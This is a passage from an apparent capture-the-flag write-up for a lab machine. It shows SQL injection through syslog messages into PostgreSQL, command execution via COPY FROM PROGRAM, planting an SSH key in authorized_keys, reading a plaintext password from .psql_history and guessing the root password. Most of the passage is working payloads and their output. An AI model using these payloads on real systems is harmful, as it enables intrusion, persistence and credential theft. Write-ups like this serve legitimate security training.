2019-09-08 11:16:57.470 GMT [28388] rsyslog@Syslog ERROR:  must be superuser or a member of the pg_write_server_files role to COPY to a file
2019-09-08 11:16:57.470 GMT [28388] rsyslog@Syslog HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.
2019-09-08 11:16:57.470 GMT [28388] rsyslog@Syslog STATEMENT:  INSERT INTO systemevents (message, devicereportedtime) values (' asdf\',now()); copy systemevents to $$/tmp/itworks$$ --','2019-09-08 11:16:57')
2019-09-08 11:16:57.476 GMT [28389] rsyslog@Syslog LOG:  statement: COMMIT
2019-09-08 11:16:57.476 GMT [28389] rsyslog@Syslog WARNING:  there is no transaction in progress
```


However, this seems to work on the box:

```bash
roy@zetta:/tmp$ logger -p local7.info $'asdf\',now()); copy syslog_lines to $$/tmp/itworks$$ --'
roy@zetta:/tmp$ cat /tmp/itworks 
1       \N      \N      2019-09-08 06:05:12.823853      \N      \N      \N       asdf\\ \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      \N      \N
```

Code execution seems to work as well:

* https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5

```bash
roy@zetta:/tmp$ logger -p local7.info $'asdf\',now()); drop table if exists cmd_exec; create table cmd_exec(cmd_output text); copy cmd_exec from program $$id$$; copy cmd_exec to $$/tmp/itworks$$; drop table if exists cmd_exec; --'
roy@zetta:/tmp$ cat /tmp/itworks 
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
```

Payload to write SSH key:

```bash
roy@zetta:~$ logger -p local7.info $'asdf\',now()); drop table if exists cmd_exec; create table cmd_exec(cmd_output text); copy cmd_exec from program $$echo "[PUBLIC-SSHKEY]" >> /var/lib/postgresql/.ssh/authorized_keys$$; copy cmd_exec to $$/tmp/itworks$$; drop table if exists cmd_exec; --'
```

Afterwards, logging in via SSH as user `postgres` is possible.

Hidden psql_history file:

```bash
postgres@zetta:~$ cat .psql_history
CREATE DATABASE syslog;
\c syslog
CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
\d syslog_lines
ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
```

Tudu xml contained hint about passwords:

```xml
<todo done="no" collapse="no">
		<title>Change shared password scheme from &lt;secret&gt;@userid to something more secure.</title>
		<text>
</text>
</todo>
```

Trying to switch user with password `sup3rs3cur3p4ass@root` succeeds:

```bash
postgres@zetta:~$ su
Password:
root@zetta:/var/lib/postgresql# cd /root/
root@zetta:~# cat root.txt
****************************4c42
```
